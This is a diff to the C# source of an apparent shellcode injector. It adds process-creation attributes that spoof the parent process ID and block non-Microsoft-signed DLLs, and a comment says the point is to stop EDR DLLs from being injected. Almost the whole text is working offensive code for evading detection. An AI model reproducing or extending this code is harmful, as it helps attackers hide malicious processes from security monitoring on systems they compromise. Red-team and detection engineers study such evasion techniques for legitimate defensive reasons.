@@ -32,54 +32,85 @@ namespace Shellcode_Injector
             }
         }
 
-        //Create proc and return the process information struct,
-        //its possible to spoof the ppid with an arbirary one
-        public static WinApi.PIN StartS(bool spoof_ppid, uint ppid, string cmd, string cwd)
+        //Set proc attributes
+        public static WinApi.SINEX SetAtt(bool spoof_ppid, bool block_dlls, uint ppid) 
         {
+            int pcount = (spoof_ppid ? 1 : 0) + (block_dlls ? 1 : 0);
 
             var sin = new WinApi.SINEX();
             sin.StartupInfo = new WinApi.SIN();
             sin.StartupInfo.cb = (int)Marshal.SizeOf(typeof(WinApi.SINEX));
+            
+            // Initialize the attribute list
+            sin.lpAttributeList = IntPtr.Zero;
+            IntPtr psize = IntPtr.Zero;
+            
+            //InitializeProcThreadAttributeList
+            WinApi.InitAtt(IntPtr.Zero, pcount, 0, ref psize);
+            
+            //Allocating memory for the attributes
+            sin.lpAttributeList = Marshal.AllocHGlobal(psize);
+            WinApi.InitAtt(sin.lpAttributeList, pcount, 0, ref psize);
 
-            // Check if spoof_ppid is enabled, if yes open a handle to the provided PID
-            if (spoof_ppid)
+            if (spoof_ppid) 
             {
-                Console.WriteLine($"Attempting to spoof PPID to {ppid}");
-                // Initialize the attribute list
-                sin.lpAttributeList = IntPtr.Zero;
-                IntPtr psize = IntPtr.Zero;
-
-                //InitializeProcThreadAttributeList
-                WinApi.InitAtt(IntPtr.Zero, 1, 0, ref psize);
-                //Allocating memory for the attributes
-                sin.lpAttributeList = Marshal.AllocHGlobal(psize);
-                WinApi.InitAtt(sin.lpAttributeList, 1, 0, ref psize);
-
                 //Set the parent process attribute
-                WinApi.PPROC pproc = new WinApi.PPROC();
                 IntPtr ppcs = WinApi.OpenP(0x001F0FFF, false, ppid); //ALL ACCESS
-                pproc.hParentProcess = ppcs;
+                IntPtr pValue = Marshal.AllocHGlobal(sizeof(long));
+                Marshal.WriteInt64(pValue, (long)ppcs);
 
                 //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                 const int PTAPP = 0x00020000;
 
                 bool sccs = WinApi.UpdateAtt(
-                    sin.lpAttributeList, 
-                    0, 
-                    new IntPtr(PTAPP), 
-                    ref pproc,
+                    sin.lpAttributeList,
+                    0,
+                    new IntPtr(PTAPP),
+                    pValue,
                     (IntPtr)IntPtr.Size,
-                    IntPtr.Zero, 
+                    IntPtr.Zero,
                     IntPtr.Zero);
 
-                if (!sccs) 
+                if (!sccs)
                 {
-                    Console.WriteLine("Error updating attrs");
+                    Console.WriteLine("Error updating ppid attr");
                     throw new Win32Exception(Marshal.GetLastWin32Error());
                 }
-
+                Marshal.FreeHGlobal(pValue);
             }
 
+            if (block_dlls) 
+            {
+                //PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
+                const int PTAMP = 0x20007;
+
+                IntPtr pValue = Marshal.AllocHGlobal(sizeof(long));
+                Marshal.WriteInt64(pValue, (long)WinApi.MitigationOptions.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
+
+                bool sccs = WinApi.UpdateAtt(
+                    sin.lpAttributeList,
+                    0,
+                    new IntPtr(PTAMP),
+                    pValue,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                if (!sccs)
+                {
+                    Console.WriteLine("Error updating mitigation policy attr");
+                    throw new Win32Exception(Marshal.GetLastWin32Error());
+                }
+                Marshal.FreeHGlobal(pValue);
+            }
+            return sin;
+        }
+
+        //Create proc and return the process information struct,
+        //its possible to spoof the ppid with an arbirary one
+        //or block the loading of non microsoft signed DLLs in order to avoid EDR dlls to be injected.
+        public static WinApi.PIN StartS(WinApi.SINEX sin, string cmd, string cwd)
+        {
             var pattr = new WinApi.SATTR();
             var tattr = new WinApi.SATTR();
             var pin = new WinApi.PIN();
